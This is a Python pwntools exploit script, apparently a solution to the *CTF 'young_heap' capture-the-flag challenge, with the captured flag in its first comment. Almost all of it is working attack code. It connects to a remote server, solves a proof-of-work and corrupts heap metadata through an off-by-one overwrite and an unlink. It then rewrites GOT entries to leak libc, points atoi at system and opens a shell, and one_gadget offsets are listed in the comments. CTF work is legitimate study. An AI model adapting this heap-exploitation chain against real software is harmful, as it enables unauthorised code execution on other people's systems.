#*ctf{0h!th3_he4p_1s_t0o_y0ung!}
from pwn import *
from hashlib import sha256
import itertools

debug=0
#context.log_level='debug'
e=ELF('./libc.so.6')
#e = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
elf = ELF('./young_heap')
if debug:
    p=process('young_heap',env={'LD_PRELOAD':'./libheap.so'})
#    gdb.attach(p)
else:
    p=remote('47.89.11.82',10009)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()

def malloc(sz,content):
    se('1\n')
    ru('Size :')
    se(str(sz)+'\n')
    ru('Content :')
    se(content)
    ru('>> ')

def edit(idx,content):
    se('2\n')
    ru('Index of heap :')
    se(str(idx)+'\n')
    ru('Content :')
    se(content)
    ru('>> ')

def free(idx):
    se('3\n')
    ru('Index of heap :')
    se(str(idx)+'\n')
    return ru('>> ')

if debug==0:
    ru('sha256(xxxx+')
    
    s=string.letters+string.digits

    chal=p.recv(16)
    ru(') == ')
    t=p.recv(64)
    print(chal)
    print(t)
    ru('Give me xxxx:')
    for i in itertools.permutations(s,4):
        sol=''.join(i)
        if sha256(sol+chal).hexdigest()==t:
            break
    p.send(sol)


malloc(0x100,'c'*0x100)        #0
malloc(0x48,'a'*0x48)    #1
malloc(0x110,'a'*0x110)  #2
malloc(0x198,'a'*0x198)  #3
malloc(0x68,'a'*0x68)    #4

edit(2,'a'*0x110+'\x79')

free(1)
free(3)

malloc(0x48,'a')#1
malloc(0x1f0,'a'*0x1f0)#3s

# payload = p64(0xffffffffffffffff)*9
# payload += p64(0) + p64(0x21)
# payload += p64(0xffffffffffffffff)*2
# payload += p64(0x20) + p64(0x21)
# payload += p64(0xffffffffffffffff)*2
payload = 'a'*0x48+p64(0x59)+p64(0x78)
payload += p64(0x6020b5 - 8)*2

edit(3,payload)

free(2)

#malloc(0x61,p64(0x6020C0)*2)#2
free(3)
malloc(0x1f0,payload)#2
#free(2)
malloc(0x61,'a')#3

payload = 'a'*3
payload += p64(elf.got['myfree'])#0
payload += p64(elf.got['setvbuf'])#1
payload += p64(elf.got['myfree'])#2
payload += p64(elf.got['atoi'])#3
malloc(0x61,payload)#5
malloc(0x100,'/bin/sh\x00')#6
#z()
edit(0,p64(elf.plt['puts'])*2)
#free(1)
#sleep(0.1)
se('3\n')
ru('Index of heap :')
se(str(1)+'\n')
#return ru('>> ')
# print p.recvall()
data = u64(p.recv(6).ljust(8,'\x00'))
success('data:'+hex(data))
libc_base = data - e.symbols['setvbuf']
success('libc_base:'+hex(libc_base))
one_gadget = 0xf0274 + libc_base
success('one_gadget:'+hex(one_gadget))
system_addr = libc_base + e.symbols['system']
success('system_addr:'+hex(system_addr))

ru('>> ')
se('2\n')
ru('Index of heap :')
se(str(3)+'\n')
ru('Content :')
se(p64(system_addr))
#z()
ru('>> ')
p.sendline('/bin/sh\x00')
# free(4)

p.interactive()
#z()


# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf0274 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1117 execve("/bin/sh", rsp+0x70, environ)
# constraints:


# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL